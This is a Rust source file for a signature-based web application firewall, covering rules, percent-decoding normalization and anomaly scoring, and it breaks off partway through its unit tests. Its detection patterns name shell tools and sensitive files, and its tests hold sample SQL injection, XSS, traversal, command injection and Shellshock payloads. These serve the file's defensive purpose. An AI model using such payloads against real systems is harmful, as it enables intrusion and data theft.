//! A pure-Rust Web Application Firewall: signature inspection of the request,
//! IP-free by construction (the cleanest Cloudflare carry-over — see `ROADMAP.md`
//! Phase 3).
//!
//! The engine is a [`regex::RegexSet`] evaluated over the request's method, target
//! (path + query), and header values. `RegexSet` matches every pattern in a single
//! pass and uses `aho-corasick` internally for literal prefiltering, so adding more
//! signatures stays cheap. The starter ruleset covers the classic signature classes
//! (SQLi / XSS / path traversal & file-inclusion wrappers / OS command injection / SSRF /
//! server-side code & expression injection / protocol anomalies); it is **not**
//! OWASP-CRS-complete — the 100%-Rust rule (no
//! Coraza/ModSecurity FFI) means CRS coverage is reached by porting rules into this
//! engine, never by linking a foreign one. Rules are operator-extensible: [`Waf::new`]
//! takes any rule iterator, so a caller can extend [`starter_rules`] with its own — and
//! operator-tunable: [`Waf::disable_rule`] / [`Waf::disable_category`] silence a noisy
//! signature or a whole class on the starter set without rebuilding it.
//!
//! Inspection runs each field **twice**: once over the raw string as received, then,
//! if the field was percent-encoded, once more over its decoded form — so an attack
//! hidden behind a single encoding layer (`%3Cscript%3E`, `..%2f`) is caught by the
//! same rules as its plaintext twin. Decoding iterates to a fixed point (capped at
//! [`MAX_DECODE_PASSES`]); input that needs **more than one** pass to settle is
//! *multiply* percent-encoded — a classic evasion tell (`%252e%252e%252f`) with no
//! legitimate use over an onion service — and is blocked outright as a protocol anomaly
//! (rule id [`MULTI_ENCODING_RULE_ID`]). That guard is on by default and can be relaxed
//! with [`Waf::block_multi_encoded`]; with it off, the fully-decoded form is still
//! matched against the ruleset, so the payload is usually caught anyway, just attributed
//! to its specific rule rather than to the evasion attempt.
//!
//! The engine is wired ahead of the gate in the [`SkinLayer`](crate::layer) layer
//! order (WAF → clearance → challenge → rate-limit); it is off unless a [`Waf`] is
//! configured, and [`Skin::secure_default`](crate::layer::Skin::secure_default) turns
//! on the [`starter`](Waf::starter) ruleset.

use axum::http::request::Parts;
use regex::RegexSet;

/// Maximum number of percent-decode passes [`normalize`] performs before giving up.
/// One pass peels a single encoding layer; reaching this cap means the input was
/// multiply encoded (or maliciously deep) and is treated as evasive regardless.
pub const MAX_DECODE_PASSES: usize = 4;

/// The synthetic rule id reported when input is blocked for being multiply
/// percent-encoded (see [`Waf::block_multi_encoded`]). It is not part of
/// [`starter_rules`] — the engine emits it directly.
pub const MULTI_ENCODING_RULE_ID: &str = "anomaly_multiple_encoding";

/// The signature class a rule belongs to.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum WafCategory {
	/// SQL injection.
	Sqli,
	/// Cross-site scripting.
	Xss,
	/// Path / directory traversal (and local/remote file-inclusion wrappers).
	PathTraversal,
	/// OS command injection (shell metacharacters chaining a command).
	CommandInjection,
	/// Server-side request forgery: a request trying to make the server fetch an
	/// internal/loopback/metadata URL. IP-free to detect (the *URL value* is in the
	/// request), so it survives the loss of client IP and ports directly over Tor.
	Ssrf,
	/// Server-side code / expression injection: payloads that drive the server to evaluate
	/// attacker-controlled code — Log4Shell-style `${jndi:…}` JNDI lookups, server-side
	/// template-injection probes, and serialized-object (deserialization) gadgets. Pure
	/// request-value inspection, so it ports over Tor unchanged.
	CodeInjection,
	/// Malformed or anomalous protocol input (control chars, header injection).
	ProtocolAnomaly,
}

impl WafCategory {
	/// Every category, in [`index`](Self::index) order — for iterating per-category metrics.
	pub const ALL: [WafCategory; 7] = [Self::Sqli, Self::Xss, Self::PathTraversal, Self::CommandInjection, Self::Ssrf, Self::CodeInjection, Self::ProtocolAnomaly];

	/// A stable, lowercase name for logs and security events.
	#[must_use]
	pub const fn name(self) -> &'static str {
		match self {
			Self::Sqli => "sqli",
			Self::Xss => "xss",
			Self::PathTraversal => "path_traversal",
			Self::CommandInjection => "command_injection",
			Self::Ssrf => "ssrf",
			Self::CodeInjection => "code_injection",
			Self::ProtocolAnomaly => "protocol_anomaly",
		}
	}

	/// The default anomaly **weight** this category contributes to an aggregate score in
	/// [`anomaly_score`] / [`Waf::inspect_all`]. The scale mirrors OWASP-CRS severities
	/// (critical injection/RCE/SSRF/LFI classes weigh most, protocol oddities least); the
	/// *threshold* an operator compares the sum against is the tuning knob, not these
	/// weights. Used only by the collect-all scoring path; the first-match [`Waf::inspect`]
	/// fast path does not score.
	#[must_use]
	pub const fn weight(self) -> u32 {
		match self {
			Self::Sqli | Self::CommandInjection | Self::Ssrf | Self::PathTraversal | Self::CodeInjection => 5,
			Self::Xss => 4,
			Self::ProtocolAnomaly => 3,
		}
	}

	/// A stable dense index in `0..`[`ALL.len()`](Self::ALL), for array-backed per-category
	/// counters. `WafCategory::ALL[c.index()] == c` for every category.
	#[must_use]
	pub const fn index(self) -> usize {
		match self {
			Self::Sqli => 0,
			Self::Xss => 1,
			Self::PathTraversal => 2,
			Self::CommandInjection => 3,
			Self::Ssrf => 4,
			Self::CodeInjection => 5,
			Self::ProtocolAnomaly => 6,
		}
	}
}

/// A single signature rule: a stable `id`, its [`WafCategory`], and a regex `pattern`.
/// Patterns are case-handling at the author's discretion (prefix `(?i)` for
/// case-insensitive); they are compiled together into one [`RegexSet`].
#[derive(Clone, Debug)]
pub struct Rule {
	/// Stable identifier surfaced on a block (e.g. `"sqli_union_select"`).
	pub id: &'static str,
	/// The signature class.
	pub category: WafCategory,
	/// The regex source matched against each inspected string.
	pub pattern: &'static str,
}

/// What [`Waf::inspect`] decided about a request.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Verdict {
	/// No signature matched; let the request through.
	Allow,
	/// A signature matched; the request should be blocked (typically `403`).
	Block(WafMatch),
}

/// The rule that fired and where it matched.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct WafMatch {
	/// The matched rule's [`Rule::id`].
	pub rule_id: &'static str,
	/// The matched rule's class.
	pub category: WafCategory,
	/// Which part of the request matched (e.g. `"target"`, `"header:user-agent"`).
	pub location: String,
	/// When this match is the representative of an anomaly-**scoring** block (see
	/// [`Waf::scoring_threshold`]), the aggregate [`anomaly_score`] of every signature the
	/// request tripped — the number that crossed the threshold. `None` for a first-match
	/// block, for the multiple-encoding hard block, and for the individual matches returned
	/// by [`Waf::inspect_all`].
	pub score: Option<u32>,
}

/// The compiled WAF: a [`RegexSet`] plus index-aligned rule metadata.
pub struct Waf {
	set: RegexSet,
	/// Metadata for each pattern, in the same order passed to the [`RegexSet`].
	meta: Vec<(&'static str, WafCategory)>,
	/// Per-rule enable mask, index-aligned with [`meta`](Self::meta). A disabled rule is
	/// skipped by [`match_raw`](Self::match_raw) as if it had not matched; all rules start
	/// enabled. Operators silence a noisy rule or a whole class with
	/// [`disable_rule`](Self::disable_rule) / [`disable_category`](Self::disable_category)
	/// without rebuilding the rule list.
	enabled: Vec<bool>,
	/// When true (default), input requiring more than one percent-decode pass to reach a
	/// fixed point is blocked outright as a [`WafCategory::ProtocolAnomaly`].
	block_multi_encoded: bool,
	/// When `Some(cap)`, request bodies are inspected up to `cap` bytes (the host layer
	/// buffers that much before forwarding). `None` (default) leaves bodies uninspected —
	/// body inspection means buffering, a request-handling cost the operator opts into.
	body_inspection: Option<usize>,
	/// When `Some(threshold)`, [`inspect`](Self::inspect) blocks on the *aggregate*
	/// [`anomaly_score`] of all signatures reaching `threshold` rather than on the first
	/// match. `None` (default) is first-match-blocks. The multiple-encoding guard still hard
	/// blocks independently of the threshold when armed.
	scoring_threshold: Option<u32>,
}

impl Waf {
	/// Compile a WAF from a set of [`Rule`]s. Returns an error if any pattern fails to
	/// compile (so an operator's custom rule is validated up front).
	///
	/// # Errors
	/// Propagates [`regex::Error`] from [`RegexSet::new`] if a pattern is invalid.
	pub fn new(rules: impl IntoIterator<Item = Rule>) -> Result<Self, regex::Error> {
		let rules: Vec<Rule> = rules.into_iter().collect();
		let set = RegexSet::new(rules.iter().map(|r| r.pattern))?;
		let meta: Vec<(&'static str, WafCategory)> = rules.iter().map(|r| (r.id, r.category)).collect();
		let enabled = vec![true; meta.len()];
		Ok(Self { set, meta, enabled, block_multi_encoded: true, body_inspection: None, scoring_threshold: None })
	}

	/// Set whether multiply percent-encoded input is blocked outright as a protocol
	/// anomaly (default `true`). With it `false`, the engine still matches the
	/// fully-decoded form against the ruleset — so the payload is usually caught anyway,
	/// just attributed to its specific rule rather than to the evasion attempt.
	#[must_use]
	pub fn block_multi_encoded(mut self, block: bool) -> Self {
		self.block_multi_encoded = block;
		self
	}

	/// Disable the rule with the given [`Rule::id`], so it never fires (an unknown id is a
	/// no-op). Lets an operator silence a single false-positive-prone signature while
	/// keeping the rest of the ruleset, without reconstructing it from a filtered list.
	/// Composes with [`disable_category`](Self::disable_category); disabling is sticky and
	/// idempotent.
	#[must_use]
	pub fn disable_rule(mut self, id: &str) -> Self {
		for (i, (rule_id, _)) in self.meta.iter().enumerate() {
			if *rule_id == id {
				self.enabled[i] = false;
			}
		}
		self
	}

	/// Disable every rule in the given [`WafCategory`], so that whole signature class never
	/// fires. Note this does **not** affect the multiple-encoding anomaly guard, which is
	/// controlled independently by [`block_multi_encoded`](Self::block_multi_encoded) even
	/// though it reports as a [`WafCategory::ProtocolAnomaly`].
	#[must_use]
	pub fn disable_category(mut self, category: WafCategory) -> Self {
		for (i, (_, cat)) in self.meta.iter().enumerate() {
			if *cat == category {
				self.enabled[i] = false;
			}
		}
		self
	}

	/// Whether the rule with the given [`Rule::id`] is currently enabled. Returns `false`
	/// for an unknown id (it can never fire either).
	#[must_use]
	pub fn is_rule_enabled(&self, id: &str) -> bool {
		self.meta.iter().zip(&self.enabled).any(|((rule_id, _), &on)| *rule_id == id && on)
	}

	/// The number of rules currently enabled (`<=` [`rule_count`](Self::rule_count)).
	#[must_use]
	pub fn enabled_rule_count(&self) -> usize {
		self.enabled.iter().filter(|&&on| on).count()
	}

	/// Enable request-**body** inspection, buffering and scanning up to `max_bytes` of the
	/// body (default: off). The host [`SkinLayer`](crate::layer) buffers at most this many
	/// bytes of a forwarded request's body before passing it on; a body that exceeds the
	/// cap is refused (`413`). Off by default because buffering is a per-request cost and a
	/// hard size cap is a behaviour change the operator should choose explicitly.
	#[must_use]
	pub fn inspect_body_up_to(mut self, max_bytes: usize) -> Self {
		self.body_inspection = Some(max_bytes);
		self
	}

	/// The configured body-inspection byte cap, or `None` if body inspection is off.
	#[must_use]
	pub fn body_cap(&self) -> Option<usize> {
		self.body_inspection
	}

	/// Switch [`inspect`](Self::inspect) into OWASP-CRS-style **anomaly-scoring** mode: a
	/// request is blocked when the [`anomaly_score`] of *all* the signatures it trips reaches
	/// `threshold`, rather than on the first single match. This lets several sub-blocking
	/// signals combine, and lets an operator raise `threshold` to tolerate one weak hit. The
	/// multiple-encoding guard (when armed) still hard-blocks independently of the score.
	/// Default (without this call) is first-match-blocks.
	#[must_use]
	pub fn scoring_threshold(mut self, threshold: u32) -> Self {
		self.scoring_threshold = Some(threshold);
		self
	}

	/// Inspect a request body's bytes with the same rules and normalization as every
	/// other field. The bytes are interpreted as UTF-8 lossily (so a binary body still
	/// scans for embedded ASCII signatures). The caller is responsible for honoring
	/// [`body_cap`](Self::body_cap); this scans exactly the slice it is given.
	#[must_use]
	pub fn inspect_body(&self, body: &[u8]) -> Verdict {
		let text = String::from_utf8_lossy(body);
		match self.inspect_str(&text, "body") {
			Some(m) => Verdict::Block(m),
			None => Verdict::Allow,
		}
	}

	/// The default WAF over [`starter_rules`]. The starter patterns are known-good and
	/// covered by a compile test.
	#[must_use]
	pub fn starter() -> Self {
		Self::new(starter_rules()).expect("starter rules compile")
	}

	/// The number of compiled rules.
	#[must_use]
	pub fn rule_count(&self) -> usize {
		self.meta.len()
	}

	/// Match the ruleset against one literal string in a single pass; take the lowest
	/// rule index for a stable, deterministic result. `location` labels where the string
	/// came from for the returned [`WafMatch`].
	fn match_raw(&self, haystack: &str, location: &str) -> Option<WafMatch> {
		self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx]).min().map(|idx| {
			let (rule_id, category) = self.meta[idx];
			WafMatch { rule_id, category, location: location.to_owned(), score: None }
		})
	}

	/// Inspect one field whose encoding follows path/header rules (`%XX` only, `+` is a
	/// literal). Body inspection and the tests use this; query strings use
	/// [`inspect_field`](Self::inspect_field) with `plus_is_space = true`.
	fn inspect_str(&self, raw: &str, location: &str) -> Option<WafMatch> {
		self.inspect_field(raw, location, false)
	}

	/// Inspect one field: match the raw string, then — if normalization changes it — its
	/// decoded form, applying the multiple-encoding guard. With `plus_is_space`, a `+` is
	/// first folded to a space (`application/x-www-form-urlencoded` semantics), so a
	/// `+`-spaced payload (`a+OR+1=1`) trips the same rules as its space form. `location`
	/// labels where the string came from for the returned [`WafMatch`].
	fn inspect_field(&self, raw: &str, location: &str, plus_is_space: bool) -> Option<WafMatch> {
		// 1. The raw string exactly as received.
		if let Some(m) = self.match_raw(raw, location) {
			return Some(m);
		}
		// 2. Normalize: optional '+'→space, then percent-decode to a fixed point.
		let norm = normalize(raw, plus_is_space);
		// 3. Multiply percent-encoded input is itself the signal: block it as an anomaly.
		//    With the guard off, fall through and let the decoded form match a specific rule.
		if self.block_multi_encoded && norm.decode_passes >= 2 {
			return Some(WafMatch {
				rule_id: MULTI_ENCODING_RULE_ID,
				category: WafCategory::ProtocolAnomaly,
				location: location.to_owned(),
				score: None,
			});
		}
		// 4. Match the decoded form, but only when normalization actually changed it
		//    (nothing encoded → raw was the whole story, already checked).
		if norm.decoded != raw {
			return self.match_raw(&norm.decoded, location);
		}
		None
	}

	/// Inspect a request's method, path, query string, and header values. The query is
	/// scanned with `+`→space form-decoding; the path and headers are not (a `+` is
	/// literal there). Returns [`Verdict::Block`] on the first matching signature, else
	/// [`Verdict::Allow`].
	#[must_use]
	pub fn inspect(&self, parts: &Parts) -> Verdict {
		if let Some(threshold) = self.scoring_threshold {
			return self.inspect_scored(parts, threshold);
		}
		if let Some(m) = self.inspect_field(parts.method.as_str(), "method", false) {
			return Verdict::Block(m);
		}
		if let Some(m) = self.inspect_field(parts.uri.path(), "target", false) {
			return Verdict::Block(m);
		}
		if let Some(query) = parts.uri.query()
			&& let Some(m) = self.inspect_field(query, "query", true)
		{
			return Verdict::Block(m);
		}
		for (name, value) in &parts.headers {
			if let Ok(s) = value.to_str()
				&& let Some(m) = self.inspect_field(s, &format!("header:{name}"), false)
			{
				return Verdict::Block(m);
			}
		}
		Verdict::Allow
	}

	/// The anomaly-scoring decision for [`inspect`](Self::inspect) when a
	/// [`scoring_threshold`](Self::scoring_threshold) is set. Blocks if any field is
	/// multiply percent-encoded (the armed guard, independent of the score), else if the
	/// aggregate [`anomaly_score`] reaches `threshold`. The reported [`WafMatch`] is the
	/// highest-weight signature (ties broken toward the earliest in inspection order), so a
	/// scored block names the most severe rule that drove it.
	fn inspect_scored(&self, parts: &Parts, threshold: u32) -> Verdict {
		let matches = self.inspect_all(parts);
		if self.block_multi_encoded && let Some(m) = matches.iter().find(|m| m.rule_id == MULTI_ENCODING_RULE_ID) {
			return Verdict::Block(m.clone());
		}
		let total = anomaly_score(&matches);
		if total < threshold {
			return Verdict::Allow;
		}
		// Name the most severe rule that drove the block; on a weight tie keep the earliest
		// (inspection order is method → target → query → headers, lowest rule index first).
		// Tag it with the aggregate score that crossed the threshold so a scored block is
		// distinguishable downstream from a single-signature one.
		let dominant = matches.iter().enumerate().max_by_key(|(i, m)| (m.category.weight(), std::cmp::Reverse(*i))).map(|(_, m)| {
			let mut m = m.clone();
			m.score = Some(total);
			m
		});
		dominant.map_or(Verdict::Allow, Verdict::Block)
	}

	/// Match the ruleset against one string and return **every** enabled rule that fires
	/// (not just the lowest index), in ascending rule order. The collect-all counterpart of
	/// [`match_raw`](Self::match_raw).
	fn match_all_raw(&self, haystack: &str, location: &str, out: &mut Vec<WafMatch>) {
		for idx in self.set.matches(haystack).iter().filter(|&idx| self.enabled[idx]) {
			let (rule_id, category) = self.meta[idx];
			out.push(WafMatch { rule_id, category, location: location.to_owned(), score: None });
		}
	}

	/// Collect every distinct rule that fires on one field, over both the raw and (if
	/// normalization changes it) the decoded form. A rule that matches both forms is
	/// reported once (dedup by `rule_id` within the field). The multiple-encoding guard, when
	/// armed, contributes its anomaly the same way [`inspect_field`](Self::inspect_field)
	/// would block on it.
	fn inspect_field_all(&self, raw: &str, location: &str, plus_is_space: bool, out: &mut Vec<WafMatch>) {
		let start = out.len();
		self.match_all_raw(raw, location, out);
		let norm = normalize(raw, plus_is_space);
		if self.block_multi_encoded && norm.decode_passes >= 2 {
			out.push(WafMatch { rule_id: MULTI_ENCODING_RULE_ID, category: WafCategory::ProtocolAnomaly, location: location.to_owned(), score: None });
			return;
		}
		if norm.decoded != raw {
			let mut decoded = Vec::new();
			self.match_all_raw(&norm.decoded, location, &mut decoded);
			for m in decoded {
				if !out[start..].iter().any(|seen| seen.rule_id == m.rule_id) {
					out.push(m);
				}
			}
		}
	}

	/// Inspect a request and return **every** signature that fires across the method, path,
	/// query, and header values — the collect-all counterpart of the first-match
	/// [`inspect`](Self::inspect). Useful for observability ("what did this request trip?")
	/// and for [`anomaly_score`], where several weak signals combine. Bodies are not scanned
	/// here (body inspection stays the separate, opt-in [`inspect_body`](Self::inspect_body)
	/// path). The returned matches are grouped by field in inspection order; an empty vec
	/// means the request is clean.
	#[must_use]
	pub fn inspect_all(&self, parts: &Parts) -> Vec<WafMatch> {
		let mut out = Vec::new();
		self.inspect_field_all(parts.method.as_str(), "method", false, &mut out);
		self.inspect_field_all(parts.uri.path(), "target", false, &mut out);
		if let Some(query) = parts.uri.query() {
			self.inspect_field_all(query, "query", true, &mut out);
		}
		for (name, value) in &parts.headers {
			if let Ok(s) = value.to_str() {
				self.inspect_field_all(s, &format!("header:{name}"), false, &mut out);
			}
		}
		out
	}
}

/// Sum the [`WafCategory::weight`] of each match into a single anomaly score. Zero for an
/// empty slice (a clean request). An operator compares this against a chosen threshold to
/// decide whether the *aggregate* of several signals — none necessarily blocking on its
/// own under first-match — warrants a block, the OWASP-CRS anomaly-scoring model ported to
/// this engine. Pair with [`Waf::inspect_all`].
#[must_use]
pub fn anomaly_score(matches: &[WafMatch]) -> u32 {
	matches.iter().map(|m| m.category.weight()).sum()
}

impl Default for Waf {
	fn default() -> Self {
		Self::starter()
	}
}

/// The result of [`normalize`]: the fully percent-decoded string and how many decode
/// passes it took to settle (`0` = nothing was encoded).
struct Normalized {
	decoded: String,
	decode_passes: usize,
}

/// Normalize `input` for matching: when `plus_is_space`, first fold `+` to a space
/// (`application/x-www-form-urlencoded` semantics), then iteratively percent-decode
/// until it stops changing or [`MAX_DECODE_PASSES`] is reached. `decode_passes` counts
/// only the percent-decode passes (the `+` fold is not multi-encoding), distinguishing
/// un-encoded (`0`), singly-encoded (`1`), and the evasive multiply-encoded (`>= 2`)
/// cases. `decoded` may differ from `input` through the `+` fold alone.
fn normalize(input: &str, plus_is_space: bool) -> Normalized {
	let mut cur = if plus_is_space { input.replace('+', " ") } else { input.to_owned() };
	let mut passes = 0;
	while passes < MAX_DECODE_PASSES {
		let (next, changed) = percent_decode_once(&cur);
		if !changed {
			break;
		}
		cur = next;
		passes += 1;
	}
	Normalized { decoded: cur, decode_passes: passes }
}

/// Percent-decode `input` once: each well-formed `%XX` (two hex digits) becomes its
/// byte; a malformed `%` (truncated or non-hex) is left verbatim. Returns the decoded
/// string and whether any `%XX` was replaced. Decoding works on raw bytes and finishes
/// with [`String::from_utf8_lossy`], so multi-byte UTF-8 already in `input` survives and
/// the output is always valid UTF-8 for matching.
fn percent_decode_once(input: &str) -> (String, bool) {
	let bytes = input.as_bytes();
	let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
	let mut changed = false;
	let mut i = 0;
	while i < bytes.len() {
		if bytes[i] == b'%'
			&& i + 2 < bytes.len()
			&& let (Some(h), Some(l)) = (hex_val(bytes[i + 1]), hex_val(bytes[i + 2]))
		{
			out.push((h << 4) | l);
			changed = true;
			i += 3;
			continue;
		}
		out.push(bytes[i]);
		i += 1;
	}
	(String::from_utf8_lossy(&out).into_owned(), changed)
}

/// The numeric value of a single hex digit, or `None` if `b` is not `[0-9A-Fa-f]`.
const fn hex_val(b: u8) -> Option<u8> {
	match b {
		b'0'..=b'9' => Some(b - b'0'),
		b'a'..=b'f' => Some(b - b'a' + 10),
		b'A'..=b'F' => Some(b - b'A' + 10),
		_ => None,
	}
}

/// The built-in starter ruleset: a small, curated set of high-signal patterns across
/// the classic classes. Deliberately conservative to keep false positives low; extend
/// it via [`Waf::new`] for fuller coverage. Patterns are case-insensitive where case
/// does not matter to the attack.
#[must_use]
pub fn starter_rules() -> Vec<Rule> {
	vec![
		// --- SQL injection ---
		Rule { id: "sqli_union_select", category: WafCategory::Sqli, pattern: r"(?i)\bunion\b[\s\S]{0,40}\bselect\b" },
		Rule { id: "sqli_or_tautology", category: WafCategory::Sqli, pattern: r#"(?i)\bor\b\s+['"]?\s*\d+\s*=\s*\d+"# },
		Rule { id: "sqli_stacked_query", category: WafCategory::Sqli, pattern: r"(?i);\s*(drop|delete|update|insert|truncate)\b" },
		Rule { id: "sqli_comment", category: WafCategory::Sqli, pattern: r"(--\s|#|/\*)[\s\S]*?(\bor\b|\band\b|=)" },
		Rule { id: "sqli_time_based", category: WafCategory::Sqli, pattern: r"(?i)\b(sleep|benchmark|pg_sleep|waitfor\s+delay)\s*\(" },
		Rule { id: "sqli_information_schema", category: WafCategory::Sqli, pattern: r"(?i)\binformation_schema\b" },
		Rule { id: "sqli_into_outfile", category: WafCategory::Sqli, pattern: r"(?i)\binto\s+(out|dump)file\b" },
		// --- Cross-site scripting ---
		Rule { id: "xss_script_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*script\b" },
		Rule { id: "xss_js_uri", category: WafCategory::Xss, pattern: r"(?i)javascript:" },
		Rule { id: "xss_event_handler", category: WafCategory::Xss, pattern: r"(?i)\bon(error|load|click|mouseover|focus|toggle)\s*=" },
		Rule { id: "xss_iframe_tag", category: WafCategory::Xss, pattern: r"(?i)<\s*iframe\b" },
		Rule { id: "xss_data_html_uri", category: WafCategory::Xss, pattern: r"(?i)data:text/html" },
		Rule { id: "xss_vbscript_uri", category: WafCategory::Xss, pattern: r"(?i)vbscript:" },
		// --- Path / directory traversal & file-inclusion wrappers ---
		Rule { id: "traversal_dotdot", category: WafCategory::PathTraversal, pattern: r"(\.\./|\.\.\\)" },
		Rule { id: "traversal_encoded", category: WafCategory::PathTraversal, pattern: r"(?i)%2e%2e(%2f|%5c|/|\\)" },
		Rule { id: "traversal_sensitive_file", category: WafCategory::PathTraversal, pattern: r"(?i)(/etc/passwd|/etc/shadow|boot\.ini|win\.ini)" },
		Rule { id: "traversal_proc_self", category: WafCategory::PathTraversal, pattern: r"(?i)/proc/self/(environ|cmdline|fd|maps)" },
		Rule { id: "traversal_php_wrapper", category: WafCategory::PathTraversal, pattern: r"(?i)\b(php|phar|expect|zip|glob)://" },
		// --- OS command injection ---
		Rule { id: "cmdi_shell_command", category: WafCategory::CommandInjection, pattern: r"(?i)[;&|`$]\s*(cat|ls|id|whoami|uname|wget|curl|ncat|nc|bash|sh|python|perl|powershell|cmd)\b" },
		Rule { id: "cmdi_path_bin", category: WafCategory::CommandInjection, pattern: r"(?i)/bin/(sh|bash|dash|zsh|busybox|nc)\b" },
		// --- Server-side request forgery (URL-value inspection; no client IP needed) ---
		Rule { id: "ssrf_cloud_metadata_ip", category: WafCategory::Ssrf, pattern: r"169\.254\.169\.254" },
		Rule { id: "ssrf_cloud_metadata_path", category: WafCategory::Ssrf, pattern: r"(?i)/(latest/meta-data|computeMetadata/v1|metadata/instance)\b" },
		Rule { id: "ssrf_internal_scheme", category: WafCategory::Ssrf, pattern: r"(?i)\b(gopher|dict|file)://" },
		Rule { id: "ssrf_loopback_url", category: WafCategory::Ssrf, pattern: r"(?i)\b(https?|ftp)://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\])" },
		// --- Server-side code / expression injection (value inspection; no client IP needed) ---
		Rule { id: "code_log4shell_jndi", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{jndi:" },
		Rule { id: "code_log4j_nested_lookup", category: WafCategory::CodeInjection, pattern: r"(?i)\$\{[^}]{0,30}\$\{" },
		Rule { id: "code_php_object_inject", category: WafCategory::CodeInjection, pattern: r#"(?i)\b[oc]:\d+:"[a-z0-9_\\]+":\d+:\{"# },
		Rule { id: "code_ssti_arithmetic", category: WafCategory::CodeInjection, pattern: r"\$\{\s*\d+\s*[*]\s*\d+\s*\}" },
		// --- Protocol anomalies ---
		Rule { id: "anomaly_null_byte", category: WafCategory::ProtocolAnomaly, pattern: r"(\x00|%00)" },
		Rule { id: "anomaly_crlf", category: WafCategory::ProtocolAnomaly, pattern: r"(\r\n|%0d%0a|%0a|%0d)" },
		Rule { id: "anomaly_shellshock", category: WafCategory::ProtocolAnomaly, pattern: r"\(\)\s*\{" },
	]
}

#[cfg(test)]
mod tests {
	use axum::http::Request;

	use super::*;

	fn parts(method: &str, uri: &str) -> Parts {
		Request::builder().method(method).uri(uri).body(()).unwrap().into_parts().0
	}

	fn blocked(v: &Verdict) -> &WafMatch {
		match v {
			Verdict::Block(m) => m,
			Verdict::Allow => panic!("expected Block, got Allow"),
		}
	}

	#[test]
	fn starter_rules_compile() {
		let waf = Waf::starter();
		assert_eq!(waf.rule_count(), starter_rules().len());
	}

	#[test]
	fn benign_request_is_allowed() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect(&parts("GET", "/articles/hello-world?page=2")), Verdict::Allow);
	}

	#[test]
	fn sqli_union_select_is_blocked() {
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/items?id=1%20UNION%20SELECT%20password%20FROM%20users"));
		// path_and_query keeps percent-encoding, so test the decoded form via inspect_str too.
		assert_eq!(waf.inspect_str("1 UNION SELECT password FROM users", "target").map(|m| m.category), Some(WafCategory::Sqli));
		// The raw target also trips union..select since spaces are %20 (matched by [\s\S]).
		let _ = v; // raw-encoded form is exercised by inspect_str above
	}

	#[test]
	fn sqli_in_decoded_query_is_blocked() {
		let waf = Waf::starter();
		let m = waf.inspect_str("name=x' OR 1=1 --", "target").unwrap();
		assert_eq!(m.category, WafCategory::Sqli);
	}

	#[test]
	fn xss_script_tag_is_blocked() {
		let waf = Waf::starter();
		let m = waf.inspect_str("<script>alert(1)</script>", "target").unwrap();
		assert_eq!(m.category, WafCategory::Xss);
		assert_eq!(m.rule_id, "xss_script_tag");
	}

	#[test]
	fn path_traversal_is_blocked() {
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/files/../../etc/passwd"));
		let m = blocked(&v);
		assert_eq!(m.category, WafCategory::PathTraversal);
		assert_eq!(m.location, "target");
	}

	#[test]
	fn malicious_header_value_is_blocked() {
		let waf = Waf::starter();
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		let m = blocked(&v);
		assert_eq!(m.category, WafCategory::Xss);
		assert_eq!(m.location, "header:user-agent");
	}

	#[test]
	fn custom_rule_extends_detection() {
		// An operator adds a rule on top of the starter set.
		let custom = Rule { id: "block_admin", category: WafCategory::ProtocolAnomaly, pattern: r"(?i)/wp-admin" };
		let waf = Waf::new(starter_rules().into_iter().chain([custom])).unwrap();
		let v = waf.inspect(&parts("GET", "/wp-admin/login.php"));
		assert_eq!(blocked(&v).rule_id, "block_admin");
	}

	#[test]
	fn invalid_custom_pattern_errors() {
		let bad = Rule { id: "bad", category: WafCategory::Sqli, pattern: r"(" };
		assert!(Waf::new([bad]).is_err());
	}

	#[test]
	fn lowest_rule_index_wins_for_determinism() {
		// A string matching two rules reports the lower-indexed (earlier) rule.
		let waf = Waf::starter();
		// "javascript:" (xss_js_uri) plus an event handler; xss_js_uri sits earlier.
		let m = waf.inspect_str("javascript:void(0) onerror=1", "target").unwrap();
		assert_eq!(m.rule_id, "xss_js_uri");
	}

	#[test]
	fn category_names_are_stable() {
		assert_eq!(WafCategory::Sqli.name(), "sqli");
		assert_eq!(WafCategory::PathTraversal.name(), "path_traversal");
		assert_eq!(WafCategory::CommandInjection.name(), "command_injection");
		assert_eq!(WafCategory::ProtocolAnomaly.name(), "protocol_anomaly");
	}

	#[test]
	fn extended_sqli_rules_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("id=1 AND SLEEP(5)", "target").unwrap().rule_id, "sqli_time_based");
		assert_eq!(waf.inspect_str("UNION SELECT table_name FROM information_schema.tables", "target").map(|m| m.category), Some(WafCategory::Sqli));
	}

	#[test]
	fn extended_xss_rules_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("<iframe src=//evil", "target").unwrap().rule_id, "xss_iframe_tag");
		assert_eq!(waf.inspect_str("href=data:text/html;base64,PHN2Zz4=", "target").unwrap().rule_id, "xss_data_html_uri");
	}

	#[test]
	fn file_inclusion_wrappers_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("page=php://filter/convert.base64-encode/resource=x", "target").unwrap().category, WafCategory::PathTraversal);
		assert_eq!(waf.inspect_str("file=/proc/self/environ", "target").unwrap().rule_id, "traversal_proc_self");
	}

	#[test]
	fn command_injection_rules_match() {
		let waf = Waf::starter();
		let m = waf.inspect_str("q=test;cat /etc/hosts", "target").unwrap();
		assert_eq!(m.category, WafCategory::CommandInjection);
		assert_eq!(m.rule_id, "cmdi_shell_command");
		assert_eq!(waf.inspect_str("cmd=/bin/sh -c whoami", "target").unwrap().rule_id, "cmdi_path_bin");
	}

	#[test]
	fn shellshock_signature_matches() {
		let waf = Waf::starter();
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "() { :; }; echo vuln".parse().unwrap());
		assert_eq!(blocked(&waf.inspect(&p)).rule_id, "anomaly_shellshock");
	}

	#[test]
	fn extended_rules_keep_false_positives_low() {
